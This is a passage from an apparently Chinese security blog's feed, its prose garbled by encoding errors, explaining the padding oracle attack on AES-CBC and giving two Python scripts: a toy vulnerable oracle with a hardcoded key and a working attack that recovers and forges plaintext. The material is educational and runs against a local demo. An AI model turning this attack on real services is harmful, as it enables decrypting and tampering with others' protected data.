´è§£è¿‡ç¨‹ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº†ä¸­é—´å€¼ï¼ˆä¸­é—´å€¼åŒå¯†æ–‡å—æ˜¯ç»‘å®šçš„ï¼‰å’ŒIVã€‚</p><p>ç»“åˆè§£å¯†çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ“çºµIVæ¥æ§åˆ¶ï¼ˆå¯†æ–‡å—ï¼‰è§£å¯†å¾—åˆ°çš„ç»“æœã€‚</p><p>å¦‚æœæƒ³è¦å°†å¯†æ–‡ä¸­ç¬¬ä¸€ä¸ªæ•°æ®å—è§£å¯†ä¸ºâ€œTESTâ€è¿™ä¸ªå€¼ï¼Œæ‚¨å¯ä»¥è®¡ç®—å‡ºå®ƒæ‰€éœ€è¦çš„IVå€¼ï¼Œåªè¦å°†ç›®æ ‡æ˜æ–‡ä¸ä¸­é—´å€¼è¿›è¡Œå¼‚æˆ–æ“ä½œå³å¯</p><p>åªè¦å°†å­—ç¬¦ä¸²â€TESTâ€å’Œ4ä¸ª<code>0x04</code>å¡«å……å­—èŠ‚ä¸ä¸­é—´å€¼å¼‚æˆ–ä¹‹åï¼Œä¾¿å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„IVï¼Œå³<code>0Ã—6Dï¼Œ0Ã—36ï¼Œ0Ã—70ï¼Œ0Ã—76ï¼Œ0Ã—03ï¼Œ0Ã—6Eï¼Œ0Ã—22ï¼Œ0Ã—39</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.52.22.png" alt="ä¼ªé€ æ˜æ–‡ç¤ºä¾‹" style="zoom:80%;"><p>å¦‚ä½•ç”Ÿæˆé•¿åº¦è¶…è¿‡ä¸€ä¸ªæ•°æ®å—çš„æ˜æ–‡ï¼Œæ¯”å¦‚è¦ç”Ÿæˆâ€ENCRYPT TESTâ€</p><p>é¦–å…ˆè¿˜æ˜¯å°†æ–‡æœ¬æ‹†æˆæ•°æ®å—ï¼Œå¹¶è®¾ç½®å¡«å……å­—èŠ‚</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.54.01.png" alt="ä¼ªé€ å¤§äºä¸€ä¸ªå—çš„æ˜æ–‡é•¿åº¦" style="zoom:60%;"><p>é€šè¿‡ç±»ä¼¼çš„æ­¥éª¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ç”ŸæˆTEST0x040x040x040x04çš„ä¸­é—´å€¼(0xc3 0x60 0xed 0xc9 0x 6d 0xf9 0x90 0x32)å’ŒIV1(ä¹Ÿå°±æ˜¯BLOCK1å¯¹åº”çš„å¯†æ–‡)ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å¼„æ˜ç™½ä¸­é—´å€¼IV1åœ¨ä½œä¸ºå¯†æ–‡æ˜¯å¦‚ä½•è§£å¯†çš„ã€‚</p><p>åªè¦ä½¿ç”¨ä¸ä¹‹å‰ç ´è§£è¿‡ç¨‹ç›¸åŒçš„æŠ€å·§å°±è¡Œäº†ï¼Œæˆ‘ä»¬æŠŠå®ƒä½œä¸ºå¯†æ–‡ä¼ é€’ç»™åº”ç”¨ç¨‹åºï¼Œå¹¶ä»å…¨éƒ¨ä¸ºNULLçš„IVå¼€å§‹è¿›è¡Œæš´åŠ›ç ´è§£ã€‚çš„åˆ°IV1å¯¹åº”çš„ä¸­é—´å€¼IV1_IMã€‚</p><p>é€šè¿‡IV1_IMå¯ä»¥æ„é€ BLOCK1çš„æ˜æ–‡ä¸ºENCRYPT%20ï¼Œç„¶åè®¡ç®—å¾—åˆ°åˆå§‹IVå€¼ã€‚ </p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2011.06.12.png" style="zoom:80%;"><h1 id="ä¸‰ã€exp"><a href="#ä¸‰ã€exp" class="headerlink" title="ä¸‰ã€exp"></a>ä¸‰ã€exp</h1><h2 id="3-1-poa-py"><a href="#3-1-poa-py" class="headerlink" title="3.1 poa.py"></a>3.1 poa.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> hexdump <span class="token keyword">import</span> hexdump<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPythonplain <span class="token operator">=</span> <span class="token string">b"Hello World! MTDP! RedTeam! 23333"</span><span class="token keyword">class</span> <span class="token class-name">POA</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    KEY <span class="token operator">=</span> <span class="token string">b"1234567890abcdef"</span>    IV <span class="token operator">=</span> <span class="token string">b"0102030405060708"</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__unpad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        _pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span>pad<span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> _pad<span class="token punctuation">:</span>            <span class="token keyword">if</span> pad <span class="token operator">!=</span> i<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error Padding! - %s"</span> <span class="token operator">%</span> _pad<span class="token punctuation">)</span>        <span class="token keyword">return</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>pad<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> plain<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad_plain <span class="token operator">=</span> cls<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        hexdump<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        pad_plain <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cls<span class="token punctuation">.</span>__unpad<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt_without_result</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cls<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> POA<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> POA<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-poa-attack-py"><a href="#3-2-poa-attack-py" class="headerlink" title="3.2 poa_attack.py"></a>3.2 poa_attack.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> pdb<span class="token keyword">from</span> poa <span class="token keyword">import</span> test<span class="token punctuation">,</span> POA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPython<span class="token keyword">class</span> <span class="token class-name">PaddingOracleAttack</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cipher <span class="token operator">=</span> cipher        <span class="token comment"># æŠŠå¯†æ–‡åˆ†å‰²æˆåˆ—è¡¨ï¼Œæ¯ä¸ªåˆ—è¡¨å…ƒç´ 16å­—èŠ‚</span>        self<span class="token punctuation">.</span>cipher_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher<span class="token punctuation">)</span>        <span class="token comment"># è§£å¯†çš„ä¸­é—´å€¼</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># å­˜å‚¨è®¡ç®—å‡ºæ¥çš„æ˜æ–‡</span>        self<span class="token punctuation">.</span>plain_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">split_block</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>        cipher_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cipher_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher_list    <span class="token keyword">def</span> <span class="token function">calc_new_tail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tail<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_tail <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> tail<span class="token punctuation">:</span>            _tail <span class="token operator">=</span> t <span class="token operator">^</span> <span class="token punctuation">(</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> idx            new_tail <span class="token operator">+=</span> _tail<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> new_tail    <span class="token keyword">def</span> <span class="token function">brute_middle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher_line<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''æš´åŠ›ç ´è§£è§£å¯†çš„ä¸­é—´å€¼'''</span>        tail <span class="token operator">=</span> <span class="token string">b""</span>        mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># ä»pad ä¸º0x01å¼€å§‹ åˆ° 0x10</span>        <span class="token keyword">for</span> pad <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># è®¡ç®—æ–°çš„padå°¾éƒ¨ï¼Œå› ä¸ºæ¯è®¡ç®—å‡ºæ¥ä¸€ä¸ªpadï¼Œå†å¾€å‰è®¡ç®—æ–°çš„padçš„æ—¶å€™ï¼Œå°¾éƒ¨çš„æ¯ä¸€ä¸ªå€¼å¼‚æˆ–å‡ºæ¥éƒ½è¦æ”¾å¤§1ä½ã€‚</span>            tail <span class="token operator">=</span> self<span class="token punctuation">.</span>calc_new_tail<span class="token punctuation">(</span>tail<span class="token punctuation">,</span> pad<span class="token punctuation">)</span>            find_pad <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># å½¢æˆ2ä¸ªå¯†æ–‡å—</span>                cipher <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> pad<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail <span class="token operator">+</span> cipher_line                <span class="token keyword">if</span> POA<span class="token punctuation">.</span>decrypt_without_result<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># print("[!] Cipher - %s" % cipher)</span>                    find_pad <span class="token operator">=</span> <span class="token boolean">True</span>                    tail <span class="token operator">=</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail                    mid_chr <span class="token operator">=</span> i <span class="token operator">^</span> pad                    mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid_chr<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> find_pad<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error not find pad!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>mid_lst<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token keyword">def</span> <span class="token function">fake</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plain<span class="token punctuation">,</span> cipher<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> mid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''ä¼ªé€         :plain: è¦ä¼ªé€ çš„æ˜æ–‡        :last_cipher: ä¸€ä¸ªå¯†æ–‡å—        :last_mid:  å¯†æ–‡å—è§£å¯†å‡ºæ¥çš„ä¸­é—´å€¼        '''</span>        pad_plain <span class="token operator">=</span> self<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        plain_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        mid <span class="token operator">=</span> mid <span class="token keyword">if</span> mid <span class="token keyword">else</span> self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> <span class="token punctuation">[</span>cipher <span class="token keyword">if</span> cipher <span class="token keyword">else</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token comment"># ä»æœ€åå¼€å§‹è®¡ç®—</span>        <span class="token keyword">for</span> plain <span class="token keyword">in</span> plain_lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            need_iv <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                _m <span class="token operator">=</span> mid<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                _p <span class="token operator">=</span> plain<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                need_iv <span class="token operator">+=</span> <span class="token punctuation">(</span>_m <span class="token operator">^</span> _p<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>            mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>need_iv<span class="token punctuation">)</span>            cipher<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> need_iv<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''è§£å¯†'''</span>        <span class="token comment"># ä»æœ€åå¼€å§‹è®¡ç®—</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            line_idx <span class="token operator">=</span> _idx <span class="token operator">-</span> <span class="token number">1</span>            cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span>            <span class="token keyword">if</span> line_idx <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token comment"># è·å–ä¸Šä¸€è¡Œå¯†æ–‡æ•°æ®ï¼Œå› ä¸ºæ¯ä¸€è¡Œçš„æ˜æ–‡åŠ å¯†ä¹‹å‰éœ€è¦ä¸ä¸Šä¸€è¡Œçš„å¯†æ–‡å¼‚æˆ–</span>                p_cipher_line <span class="token operator">=</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span>line_idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># å¦‚æœæ˜¯ç¬¬ä¸€è¡Œï¼Œåˆ™å…¶ä¸IVå¼‚æˆ–</span>                p_cipher_line <span class="token operator">=</span> iv            _mid <span class="token operator">=</span> self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>cipher_line<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> _mid<span class="token punctuation">)</span>            <span class="token keyword">for</span> idx<span class="token punctuation">,</span> _m <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>_mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                plain_chr <span class="token operator">=</span> _m <span class="token operator">^</span> p_cipher_line<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">[</span>line_idx<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>plain_chr<span class="token punctuation">)</span>        plain <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> p <span class="token keyword">in</span> self<span class="token punctuation">.</span>plain_lst<span class="token punctuation">:</span>            plain <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>        <span class="token keyword">return</span> plain<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># è·å–å¯†æ–‡</span>    iv <span class="token operator">=</span> POA<span class="token punctuation">.</span>IV         <span class="token comment"># è·å–åˆå§‹åŒ–å‘é‡</span>    poa_atck <span class="token operator">=</span> PaddingOracleAttack<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    new_iv<span class="token punctuation">,</span> new_cipher <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>fake<span class="token punctuation">(</span><span class="token string">b"wo ai beijing tianan men!"</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> poa_atck<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ç®—æ³•å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padding oracleæ”»å‡» </tag>
            
            <tag> webå®‰å…¨ä¸­çš„å¯†ç å­¦æ”»å‡» </tag>
            
            <tag> å¯†ç å­¦ç®—æ³•å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/</url>
      
